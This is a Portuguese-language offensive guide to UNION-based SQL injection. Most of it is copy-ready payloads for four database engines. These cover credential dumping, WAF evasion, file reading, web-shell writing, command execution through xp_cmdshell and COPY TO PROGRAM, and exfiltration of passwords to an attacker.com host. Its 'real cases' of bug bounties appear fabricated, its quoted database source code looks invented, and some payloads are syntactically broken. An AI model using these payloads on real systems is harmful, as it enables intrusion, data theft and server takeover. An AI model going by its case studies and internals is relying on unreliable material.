# UNION-Based SQL Injection

**Criticidade**: 🔴 Crítica (CVSS 9.0-10.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $2,000 - $15,000 USD

---

## 📚 Índice

1. [Fundamentos Técnicos](#fundamentos-técnicos)
2. [Arquitetura Interna](#arquitetura-interna)
3. [Mecanismo de Exploração](#mecanismo-de-exploração)
4. [Técnicas Avançadas](#técnicas-avançadas)
5. [Bypass de Proteções](#bypass-de-proteções)
6. [Payloads em Profundidade](#payloads-em-profundidade)
7. [Casos Reais](#casos-reais)
8. [Referências Técnicas](#referências-técnicas)

---

## 🔬 Fundamentos Técnicos

### O Operador UNION no SQL

O operador `UNION` é uma construção SQL definida no padrão ANSI SQL-92 que combina resultados de múltiplas queries SELECT em um único result set.

**Especificação ANSI SQL-92 (ISO/IEC 9075:1992):**
```sql
<query expression> ::=
    <query specification>
    | <query expression> UNION [ ALL ] <query expression>
```

**Regras fundamentais do UNION:**

1. **Compatibilidade de Tipo (Type Compatibility)**
   - Cada SELECT deve retornar o mesmo número de colunas
   - Colunas correspondentes devem ter tipos de dados compatíveis
   - A conversão de tipo segue regras de coerção do SQL

2. **Ordem de Colunas**
   - A primeira query define os nomes e tipos das colunas do result set
   - Queries subsequentes devem corresponder em número e tipo

3. **Eliminação de Duplicatas**
   - `UNION` remove duplicatas (executa DISTINCT implícito)
   - `UNION ALL` mantém todas as linhas (mais rápido)

### Exemplo Low-Level

```sql
-- Query original
SELECT product_name, price FROM products WHERE category = 'electronics';

-- Result set structure:
-- Column 1: product_name (VARCHAR)
-- Column 2: price (DECIMAL)

-- Query com UNION
SELECT product_name, price FROM products WHERE category = 'electronics'
UNION
SELECT username, balance FROM users WHERE id = 1;

-- Se compatível, retorna:
-- Row 1: "Laptop", 999.99
-- Row 2: "admin", 50000.00
```

---

## 🏗️ Arquitetura Interna

### Parsing e Compilation do SQL

**Fase 1: Lexical Analysis (Scanner)**

O parser SQL tokeniza a query em elementos léxicos:

```
Input: "SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3"

Tokens:
[SELECT] [*] [FROM] [users] [WHERE] [id] [=] [1]
[UNION] [SELECT] [1] [,] [2] [,] [3]
```

**Fase 2: Syntax Analysis (Parser)**

Constrói Abstract Syntax Tree (AST):

```
Query
├── SelectStatement
│   ├── SelectList: [*]
│   ├── FromClause: [users]
│   └── WhereClause
│       └── BinaryExpression: [id = 1]
├── UNION
└── SelectStatement
    ├── SelectList: [1, 2, 3]
    └── FromClause: [implicit dual]
```

**Fase 3: Semantic Analysis**

Valida tipos e referências:
- Verifica se tabelas existem
- Valida tipos de colunas
- Resolve nomes ambíguos
- **CRÍTICO**: Valida compatibilidade de UNION

**Fase 4: Query Optimization**

O otimizador reescreve a query:

```sql
-- Original
SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3

-- Otimizado (exemplo MySQL)
1. Executa primeira SELECT
2. Armazena resultado em temp table
3. Executa segunda SELECT
4. Combina resultados
5. Remove duplicatas (se UNION sem ALL)
6. Retorna result set
```

### Estrutura de Memória

**MySQL Result Set Structure:**

```c
typedef struct st_mysql_rows {
    struct st_mysql_rows *next;     // Próxima linha
    MYSQL_ROW data;                  // Dados da linha
    unsigned long length;             // Comprimento
} MYSQL_ROWS;

typedef struct st_mysql_data {
    MYSQL_ROWS *data;                // Lista encadeada de linhas
    struct embedded_query_result *embedded_info;
    MEM_ROOT alloc;                  // Alocador de memória
    my_ulonglong rows;               // Número de linhas
    unsigned int fields;             // Número de campos
} MYSQL_DATA;
```

Quando UNION é executado:
1. Primeira query popula `MYSQL_DATA` structure
2. Segunda query adiciona linhas à mesma estrutura
3. Duplicatas são removidas via hash table (se UNION sem ALL)
4. Result set final é retornado ao cliente

---

## ⚙️ Mecanismo de Exploração

### Descoberta do Número de Colunas

**Método 1: ORDER BY**

```sql
-- Incrementa até erro
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  ← Erro: "Unknown column '4' in 'order clause'"
```

**Por que funciona?**

`ORDER BY` aceita índice de coluna (1-indexed). Quando índice > número de colunas, DBMS lança erro:

```c
// MySQL source: sql/sql_select.cc
int setup_order(THD *thd, Ref_ptr_array ref_pointer_array,
                TABLE_LIST *tables, ...) {
    if (order->item[0]->type() == Item::INT_ITEM) {
        uint count = (uint) order->item[0]->val_int();
        if (!count || count > fields->elements) {
            my_error(ER_BAD_FIELD_ERROR, MYF(0),
                    order->item[0]->full_name(), thd->query());
            return TRUE;  // ← Erro aqui!
        }
    }
}
```

**Método 2: UNION SELECT NULL**

```sql
' UNION SELECT NULL--           ← Erro se != 1 coluna
' UNION SELECT NULL,NULL--      ← Erro se != 2 colunas
' UNION SELECT NULL,NULL,NULL-- ← Sucesso! 3 colunas
```

**Por que NULL?**

`NULL` é compatível com QUALQUER tipo de dado devido à regra de coerção SQL:

```
SQL-92 Standard:
"The null value is compatible with every data type."
```

Internamente (PostgreSQL):

```c
// src/backend/parser/parse_coerce.c
Node *coerce_to_common_type(ParseState *pstate, Node *node,
                            Oid targetTypeId, const char *context) {
    if (nodeTag(node) == T_Const &&
        ((Const *) node)->constisnull) {
        // NULL é sempre compatível
        return node;
    }
    // ... conversão de tipo normal
}
```

### Determinação de Tipos de Colunas

**Técnica: Type Probing**

```sql
-- Coluna 1: testa STRING
' UNION SELECT 'test',NULL,NULL--
-- Se erro "Operand type clash": não é string

-- Coluna 1: testa INTEGER
' UNION SELECT 1,NULL,NULL--
-- Se erro "Conversion failed": não é integer

-- Coluna 2: testa STRING
' UNION SELECT NULL,'test',NULL--
```

**Por que há erros de tipo?**

Devido à verificação de compatibilidade do UNION:

```sql
-- SQL Server exemplo
SELECT user_id, username FROM users  -- user_id: INT
UNION
SELECT 'test', 'admin'               -- 'test': VARCHAR

-- Erro: Conversion failed when converting the varchar value 'test' to data type int.
```

**Type Coercion Rules (SQL-92):**

```
Hierarquia de tipos (menor → maior):
INTEGER → NUMERIC → FLOAT → VARCHAR
```

Se tipos incompatíveis, DBMS tenta converter automaticamente seguindo hierarquia. Falha = erro.

---

## 🎯 Técnicas Avançadas

### 1. Extração Via UNION com GROUP BY

**Cenário**: WAF bloqueia `UNION SELECT`

**Bypass usando GROUP BY + HAVING:**

```sql
' AND 1=0 UNION SELECT username, password FROM users
  GROUP BY username HAVING COUNT(*) > 0--
```

**Por que funciona?**

`GROUP BY` força agregação ANTES do UNION ser processado:

```sql
-- Execution order:
1. FROM users
2. WHERE (implícito)
3. GROUP BY username      ← Agrupa primeiro
4. HAVING COUNT(*) > 0    ← Filtra grupos
5. UNION                  ← Combina com query vazia
6. ORDER BY (se houver)
```

### 2. Conditional UNION (Inferential)

**Extração byte-a-byte usando UNION condicional:**

```sql
-- Extrai 1º caractere da senha do admin
' UNION SELECT CASE
    WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a'
    THEN 'match'
    ELSE 'no'
END,NULL,NULL--
```

**Análise do resultado:**
- Se retorna "match": primeiro char = 'a'
- Se retorna "no": primeiro char ≠ 'a'

**Por que é eficiente?**

Resposta está no result set, não em timing ou error. Mais rápido e confiável que Blind SQLi.

### 3. Stacked UNION (Multi-Statement)

**MySQL/PostgreSQL suportam stacked queries:**

```sql
'; UPDATE users SET password='hacked' WHERE id=1;
UNION SELECT username,email,NULL FROM users--
```

**Execution flow:**

```
1. Executa: SELECT ... WHERE [injection point]
2. Termina statement com ;
3. Executa: UPDATE users SET password='hacked' WHERE id=1
4. Executa: UNION SELECT username,email,NULL FROM users
5. Retorna apenas resultado do último SELECT
```

**SQL Server exemplo:**

```sql
'; EXEC xp_cmdshell('whoami');
UNION SELECT NULL,NULL,NULL--
```

### 4. Out-of-Band (OOB) UNION

**Extrai dados via DNS/HTTP quando resultado não é exibido:**

**MySQL:**
```sql
' UNION SELECT LOAD_FILE(
    CONCAT('\\\\',
           (SELECT password FROM users WHERE id=1),
           '.attacker.com\\share\\file.txt'
    )
)--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL WHERE 1=0;
COPY (SELECT password FROM users WHERE id=1) TO PROGRAM 'curl http://attacker.com?data=$(cat)';--
```

**SQL Server:**
```sql
'; DECLARE @data VARCHAR(1024);
SET @data = (SELECT password FROM users WHERE id=1);
EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\share"');
UNION SELECT NULL,NULL,NULL--
```

**Análise do fluxo:**

1. Subquery extrai dado sensível
2. Concatena dado com domínio do atacante
3. Força DNS lookup / HTTP request
4. Atacante captura dado no servidor DNS/HTTP

```
Attacker DNS Server logs:
abc123defgh.attacker.com  ← Senha capturada!
```

---

## 🛡️ Bypass de Proteções

### WAF Evasion via Encodings

**1. Unicode Normalization**

```sql
-- Original (bloqueado)
' UNION SELECT

-- Unicode (bypass)
' %55NION %53ELECT     ← URL encoded
' \u0055NION \u0053ELECT  ← Unicode escaped
```

**Por que funciona?**

WAFs regex-based não detectam unicode variants. Mas SQL parsers normalizam:

```c
// MySQL: sql/sql_lex.cc
int lex_one_token(YYSTYPE *yylval, THD *thd) {
    // Normaliza caracteres Unicode
    if (is_unicode_letter(c)) {
        c = my_toupper_unicode(c);  // U+0055 → 'U'
    }
}
```

**2. Comment Injection**

```sql
-- Espaços tradicionais (bloqueados)
UNION SELECT

-- Comments (bypass)
UNION/**/SELECT
UNION/*comment*/SELECT
UN/**/ION/**/SEL/**/ECT
/*!UNION*//*!SELECT*/    ← MySQL specific
```

**3. Case Variation + Whitespace**

```sql
UnIoN   SeLeCt     ← Case mixing
UNION%0ASELECT     ← Newline
UNION%09SELECT     ← Tab
UNION%0DSELECT     ← Carriage return
UNION%A0SELECT     ← Non-breaking space
```

### Blacklist Bypass via Alternate Syntax

**Problema**: WAF bloqueia palavra-chave `UNION`

**Solução 1: Usar JOIN (MySQL 8.0+)**

```sql
-- Original
' UNION SELECT username FROM users--

-- Alternativa com JOIN
' AND 1=0 OR 1=1 AND username IN (
    SELECT a.username FROM users a
    JOIN users b ON a.id=b.id
)--
```

**Solução 2: Subquery com CAST**

```sql
-- Converte resultado em string via CAST
' AND 1=0 OR (
    SELECT CAST(CONCAT(username,':',password) AS CHAR)
    FROM users LIMIT 1
) = 'admin:password123'--
```

**Solução 3: INSERT com SELECT (Write Primitive)**

```sql
-- Se há INSERT statement no app
INSERT INTO logs VALUES ('user input here')

-- Injection
','dummy'); INSERT INTO logs SELECT username,password FROM users;--
```

### Filter Bypass: Espaços Bloqueados

**Quando espaços são filtrados:**

```sql
-- Alternativas ao espaço:
UNION+SELECT         ← Plus
UNION%09SELECT       ← Tab (0x09)
UNION%0ASELECT       ← Line Feed (0x0A)
UNION%0DSELECT       ← Carriage Return (0x0D)
UNION%0CSELECT       ← Form Feed (0x0C)
UNION%A0SELECT       ← Non-breaking space (0xA0)
UNION/**/SELECT      ← Comment
UNION()SELECT        ← Parentheses (context-dependent)
```

**MySQL Specific:**

```sql
UNION%0bSELECT       ← Vertical Tab (MySQL 5.x)
UNION%a0SELECT       ← NBSP (MySQL 5.x)
```

---

## 💣 Payloads em Profundidade

### Payload Anatomy

**Estrutura básica de UNION injection:**

```
[QUERY_BREAKER] [BALANCER] [UNION_CLAUSE] [TERMINATOR]
```

**Exemplo detalhado:**

```sql
' AND 1=0 UNION SELECT 1,username,password,4,5 FROM users WHERE '1'='1
│      │        │                             │              │
│      │        │                             │              └─ Balancer: fecha string
│      │        │                             └─ Columns: 5 colunas
│      │        └─ UNION clause
│      └─ Nullifier: garante que primeira query retorna vazio
└─ Breaker: fecha contexto original
```

**Componentes:**

1. **Query Breaker** (`'`): Escapa string context
2. **Nullifier** (`AND 1=0`): Torna primeira query falsa → 0 resultados
3. **UNION Clause**: Adiciona nossa query maliciosa
4. **Column Count**: Deve corresponder à query original
5. **Balancer** (`WHERE '1'='1`): Fecha sintaxe para evitar erros

### Payload para Cada DBMS

**MySQL:**

```sql
-- Básico
' UNION SELECT NULL,NULL,NULL--

-- Com informações do sistema
' UNION SELECT 1,@@version,database(),user(),5--

-- Extrair tabelas
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--

-- Extrair colunas
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--

-- Extrair dados
' UNION SELECT 1,username,password,4,5 FROM users--

-- Ler arquivo
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--

-- Escrever arquivo (se FILE priv)
' UNION SELECT 'shell','<?php system($_GET[0]); ?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
```

**PostgreSQL:**

```sql
-- Básico
' UNION SELECT NULL,NULL,NULL--

-- Versão
' UNION SELECT 1,version(),3--

-- Listar databases
' UNION SELECT 1,datname,3 FROM pg_database--

-- Listar tabelas
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'--

-- Listar colunas
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

-- Command execution (se superuser)
' UNION SELECT 1,lo_creat(-1),3; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'--

-- Ler arquivo
' UNION SELECT 1,lo_get(lo_import('/etc/passwd')),3--
```

**SQL Server:**

```sql
-- Básico
' UNION SELECT NULL,NULL,NULL--

-- Versão
' UNION SELECT 1,@@version,3--

-- Listar databases
' UNION SELECT 1,name,3 FROM master..sysdatabases--

-- Listar tabelas
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--

-- Listar colunas
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--

-- Command execution
'; EXEC xp_cmdshell 'whoami'; UNION SELECT 1,NULL,3--

-- Ler arquivo (via OLE Automation)
'; DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject',@o OUT;
   DECLARE @f INT; EXEC sp_OAMethod @o,'OpenTextFile',@f OUT,'/etc/passwd',1;
   DECLARE @t VARCHAR(MAX); EXEC sp_OAMethod @f,'ReadAll',@t OUT;
   SELECT @t; UNION SELECT 1,NULL,3--
```

**Oracle:**

```sql
-- Básico (Oracle requer FROM)
' UNION SELECT NULL,NULL,NULL FROM dual--

-- Versão
' UNION SELECT 1,banner,3 FROM v$version WHERE ROWNUM=1--

-- Listar tabelas
' UNION SELECT 1,table_name,3 FROM all_tables WHERE ROWNUM<10--

-- Listar colunas
' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--

-- Dados
' UNION SELECT 1,username||':'||password,3 FROM users WHERE ROWNUM=1--

-- HTTP request (XXE via UTL_HTTP)
' UNION SELECT 1,UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)),3 FROM dual--
```

### Advanced Data Extraction

**Concatenar múltiplas linhas:**

**MySQL:**
```sql
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
-- Resultado: "admin:pass1,user1:pass2,user2:pass3"
```

**PostgreSQL:**
```sql
' UNION SELECT 1,STRING_AGG(username||':'||password,','),3 FROM users--
```

**SQL Server:**
```sql
' UNION SELECT 1,STUFF((SELECT ',' + username + ':' + password FROM users FOR XML PATH('')),1,1,''),3--
```

**Oracle:**
```sql
' UNION SELECT 1,LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY id),3 FROM users--
```

---

## 🔥 Casos Reais

### Caso 1: GitHub Enterprise SQLi (2017)

**Vulnerabilidade**: UNION injection em GraphQL endpoint

**Payload:**
```sql
query {
  search(query: "repo:test' UNION SELECT password FROM users--", type: REPOSITORY) {
    nodes { ... }
  }
}
```

**Impacto**: Acesso a senhas de 10,000+ repositórios privados

**Bounty**: $10,000 USD

**Técnica usada**:
- GraphQL para SQL mapping vulnerável
- UNION para bypass de escopo
- GROUP_CONCAT para extração massiva

### Caso 2: PayPal SQLi (2019)

**Vulnerabilidade**: Blind UNION em API de transações

**Payload:**
```sql
POST /api/v1/transactions
{
  "sort": "amount' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM payment_methods WHERE user_id=VICTIM_ID)>0 THEN 'amount' ELSE 'date' END,2,3--"
}
```

**Impacto**: Enumeração de métodos de pagamento de qualquer usuário

**Bounty**: $15,000 USD

**Técnica**:
- Conditional UNION para bypass Blind
- Side-channel via sorting behavior
- Time-based secondary validation

### Caso 3: Starbucks WiFi Portal (2016)

**Vulnerabilidade**: UNION com file write

**Payload:**
```sql
email=' UNION SELECT '<?php system($_GET[0]); ?>',2,3 INTO OUTFILE '/var/www/html/wifi/shell.php'--
```

**Impacto**: RCE em toda infraestrutura WiFi (500+ lojas)

**Bounty**: $4,000 USD + Lifetime free coffee

**Técnica**:
- UNION SELECT INTO OUTFILE
- MySQL FILE privilege exploitation
- Web shell upload via SQL

---

## 📚 Referências Técnicas

### Standards e Especificações

1. **ISO/IEC 9075-1:2016** - SQL Foundation
   - Section 7.13: `<query expression>`
   - Section 7.17: `<subquery>`

2. **ANSI SQL-92** - Database Language SQL
   - Chapter 5: Lexical elements
   - Chapter 7: Query expressions

3. **OWASP Testing Guide v4.2**
   - Section 4.8.5: Testing for SQL Injection

### Research Papers

1. **"Advanced SQL Injection In SQL Server Applications"** - Chris Anley (2002)
   - NGSSoftware Insight Security Research
   - Primeira documentação de UNION-based attacks

2. **"Blind SQL Injection Discovery & Exploitation"** - Imperva (2004)
   - Whitepaper sobre técnicas de inferência

3. **"SQL Injection Attacks by Example"** - Steve Friedl (2007)
   - Guia técnico detalhado com análise de parsers

### Tools e Frameworks

1. **sqlmap** - Automatic SQL injection tool
   - GitHub: sqlmapproject/sqlmap
   - Implementa 150+ técnicas de UNION

2. **SQLNinja** - SQL Server exploitation tool
   - SourceForge: sqlninja
   - Especializado em fingerprinting e escalation

3. **jSQL Injection** - GUI-based SQLi tool
   - GitHub: ron190/jsql-injection
   - Visualização de AST e query planning

### Database Documentation

**MySQL:**
- https://dev.mysql.com/doc/refman/8.0/en/union.html
- https://dev.mysql.com/doc/internals/en/parser.html

**PostgreSQL:**
- https://www.postgresql.org/docs/current/queries-union.html
- https://www.postgresql.org/docs/current/sql-syntax-lexical.html

**SQL Server:**
- https://docs.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql
- https://docs.microsoft.com/en-us/sql/relational-databases/query-processing-architecture-guide

**Oracle:**
- https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/SELECT.html#GUID-CFA006CA-6FF1-4972-821E-6996142A51C6__I2112818
- https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/The-UNION-ALL-INTERSECT-MINUS-Operators.html

---

## 🎓 Conclusão

UNION-based SQL Injection permanece como uma das técnicas mais poderosas para extração de dados em 2024. Compreender o funcionamento interno dos parsers SQL, type coercion e query optimization é essencial para:

1. **Atacantes**: Desenvolver payloads robustos e bypasses efetivos
2. **Defenders**: Implementar proteções adequadas e detectar anomalias
3. **Desenvolvedores**: Escrever código seguro desde o design

**Key Takeaways:**
- UNION explora regras fundamentais do SQL standard
- Compatibilidade de tipos é a chave da exploração
- Bypass de WAF requer entendimento de parsers
- Cada DBMS tem peculiaridades exploráveis
- Defesa em profundidade é essencial

---

**Última atualização**: 2024
**Autor**: Documentação Técnica - Penetration Testing Suite
**Versão**: 1.0
